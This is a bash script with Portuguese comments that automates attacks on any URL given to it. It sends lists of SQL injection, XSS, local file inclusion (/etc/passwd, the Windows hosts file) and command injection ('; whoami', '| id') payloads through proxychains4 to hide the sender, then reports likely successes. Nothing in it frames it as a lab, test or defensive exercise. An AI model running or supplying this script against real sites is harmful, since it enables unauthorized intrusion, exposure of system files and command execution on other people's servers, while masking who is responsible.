#!/bin/bash
# Exploits automatizados
echo "=== EXPLOIT AUTOMÁTICO ==="

if [ -z "$1" ]; then
    echo "Uso: $0 <URL>"
    echo "Exemplo: $0 https://target.com"
    exit 1
fi

URL="$1"
echo "Testando exploits em: $URL"

# SQLi básico
echo -e "\n[1] Testando SQL Injection..."
SQLI_PAYLOADS=(
    "'"
    "1' OR '1'='1"
    "admin'--"
    "' UNION SELECT NULL--"
    "1' AND 1=1--"
)

for payload in "${SQLI_PAYLOADS[@]}"; do
    echo "SQLi: $payload"
    proxychains4 -q curl -s "$URL?id=$payload" | grep -i "error\|mysql\|sql\|warning" && echo "POSSÍVEL SQLI!"
done

# XSS básico
echo -e "\n[2] Testando XSS..."
XSS_PAYLOADS=(
    "<script>alert(1)</script>"
    "javascript:alert(1)"
    "<img src=x onerror=alert(1)>"
    "';alert(1);//"
)

for payload in "${XSS_PAYLOADS[@]}"; do
    echo "XSS: $payload"
    proxychains4 -q curl -s "$URL?q=$payload" | grep -i "$payload" && echo "POSSÍVEL XSS!"
done

# LFI básico
echo -e "\n[3] Testando LFI..."
LFI_PAYLOADS=(
    "../../../etc/passwd"
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
    "/etc/passwd"
    "C:\\windows\\system32\\drivers\\etc\\hosts"
)

for payload in "${LFI_PAYLOADS[@]}"; do
    echo "LFI: $payload"
    proxychains4 -q curl -s "$URL?file=$payload" | grep -i "root:\|administrator" && echo "POSSÍVEL LFI!"
done

# Command Injection
echo -e "\n[4] Testando Command Injection..."
CMD_PAYLOADS=(
    "; whoami"
    "| whoami"
    "&& whoami"
    "; id"
    "| id"
)

for payload in "${CMD_PAYLOADS[@]}"; do
    echo "CMD: $payload"
    proxychains4 -q curl -s "$URL?cmd=test$payload" | grep -i "uid=\|gid=" && echo "POSSÍVEL CMD INJECTION!"
done